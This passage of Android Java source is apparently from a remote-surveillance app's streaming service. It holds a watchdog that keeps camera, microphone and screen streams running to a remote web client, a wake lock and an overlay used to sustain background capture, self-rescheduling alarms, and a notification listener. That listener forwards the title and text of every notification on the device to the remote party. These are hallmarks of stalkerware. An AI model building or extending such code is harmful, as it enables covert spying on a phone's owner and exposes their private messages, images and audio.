    }

    private void startInternalWatchdog() {
        internalWatchdogHandler.removeCallbacks(internalWatchdogRunnable);
        internalWatchdogHandler.postDelayed(internalWatchdogRunnable, INTERNAL_WATCHDOG_INTERVAL_MS);
    }

    private void stopInternalWatchdog() {
        internalWatchdogHandler.removeCallbacks(internalWatchdogRunnable);
    }

    public boolean isServiceRunning() {
        return instance != null;
    }

    public void ensureSocketConnected() {
        if (socket == null) {
            connectSignaling();
            return;
        }
        if (!socket.connected() && !socket.isActive()) {
            try {
                Log.d(TAG, "Watchdog reconnecting Socket.IO...");
                socket.connect();
            } catch (Exception e) {
                Log.e(TAG, "Error connecting socket", e);
            }
        }
    }

    /**
     * Periodic watchdog check that verifies whether the service is streaming normally
     * and reconnects/re-runs components if anything has stalled or disconnected.
     */
    public synchronized void checkAndEnforceStreaming() {
        Log.d(TAG, "[InternalWatchdog] Checking streaming health...");

        // 1. Check socket connectivity
        ensureSocketConnected();

        // 2. Ensure wake lock is acquired and held
        acquireWakeLock();

        // 3. Ensure overlay view is present for background camera/mic stability
        OverlayWindowManager.ensureOverlay(this);

        // 4. Verify and re-run active camera streams if stalled and hardware not busy
        if (cameraManager != null) {
            if (isBackCameraStreaming) {
                if (!cameraManager.isBackRunning() && !cameraManager.isBackHardwareBusy()) {
                    Log.w(TAG, "[InternalWatchdog] Back camera should be streaming but capturer stopped! Restarting...");
                    cameraManager.startBackCamera();
                }
                if (cameraManager.getBackTrack() != null) {
                    cameraManager.getBackTrack().setEnabled(!cameraManager.isBackHardwareBusy());
                }
            }
            if (isFrontCameraStreaming) {
                if (!cameraManager.isFrontRunning() && !cameraManager.isFrontHardwareBusy()) {
                    Log.w(TAG, "[InternalWatchdog] Front camera should be streaming but capturer stopped! Restarting...");
                    cameraManager.startFrontCamera();
                }
                if (cameraManager.getFrontTrack() != null) {
                    cameraManager.getFrontTrack().setEnabled(!cameraManager.isFrontHardwareBusy());
                }
            }
        }

        // 5. Verify and re-run active mic stream if stalled
        if (isMicStreaming && (audioTrack == null || audioSource == null)) {
            Log.w(TAG, "[InternalWatchdog] Mic stream is flagged active but audio track is null. Re-initializing...");
            setMicStreaming(true);
        }

        // 6. Check WebRTC PeerConnection health when a web client is waiting AND streaming is active
        boolean isStreamingActive = isFrontCameraStreaming || isBackCameraStreaming || isScreenStreaming || isMicStreaming;
        if (isStreamingActive && webClientId != null && socket != null && socket.connected()) {
            if (peerConnection == null ||
                    peerConnection.iceConnectionState() == PeerConnection.IceConnectionState.FAILED ||
                    peerConnection.iceConnectionState() == PeerConnection.IceConnectionState.CLOSED) {
                Log.w(TAG, "[InternalWatchdog] Active stream PeerConnection is in failed/closed state (" +
                        (peerConnection != null ? peerConnection.iceConnectionState() : "null") + "). Rebuilding...");
                rebuildPeerConnection();
            }
        }

        // 7. Push telemetry keepalive
        sendStreamStatus();
        sendDeviceInfo();

        // 8. Re-arm external watchdog alarm
        StreamingWatchdogReceiver.scheduleNext(this);
    }

    public synchronized void rebuildPeerConnection() {
        Log.i(TAG, "Rebuilding WebRTC PeerConnection from scratch...");
        try {
            synchronized (pendingIceCandidates) {
                pendingIceCandidates.clear();
            }
            if (peerConnection != null) {
                try {
                    peerConnection.close();
                } catch (Exception ignored) {}
                peerConnection = null;
            }
            setupPeerConnection();
            if (webClientId != null && socket != null && socket.connected()) {
                createAndSendOffer();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error rebuilding PeerConnection", e);
        }
    }

    public void sendNotification(StatusBarNotification sbn) {
        if (socket == null || !socket.connected() || sbn == null) return;
        try {
            Notification notification = sbn.getNotification();
            if (notification == null || notification.extras == null) return;

            String appName = sbn.getPackageName();
            CharSequence titleCs = notification.extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence textCs = notification.extras.getCharSequence(Notification.EXTRA_TEXT);
            String title = titleCs != null ? titleCs.toString() : "No Title";
            String text = textCs != null ? textCs.toString() : "No Text";
            String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(sbn.getPostTime()));

            JSONObject notificationData = new JSONObject();
            notificationData.put("appName", appName != null ? appName : "");
            notificationData.put("title", title);
            notificationData.put("text", text);
            notificationData.put("timestamp", timestamp);

            JSONObject msg = new JSONObject();
            if (webClientId != null) msg.put("to", webClientId);
            msg.put("from", socket.id());
            msg.put("notification", notificationData);

            socket.emit(Constants.EVENT_NOTIFICATION, msg);
            Log.d(TAG, "Sent notification via main socket: " + notificationData);
        } catch (Exception e) {
            Log.e(TAG, "Error sending notification", e);
        }
    }

    public static class NotificationListener extends NotificationListenerService {
        @Override
        public void onCreate() {
            super.onCreate();
            Log.d(TAG, "NotificationListener onCreate");
        }

        @Override
        public void onNotificationPosted(StatusBarNotification sbn) {
            StreamingService service = StreamingService.getInstance();
            if (service != null) {
                service.sendNotification(sbn);
            }
        }

        @Override
        public void onDestroy() {
            super.onDestroy();
            Log.d(TAG, "NotificationListener onDestroy");
        }
    }
}
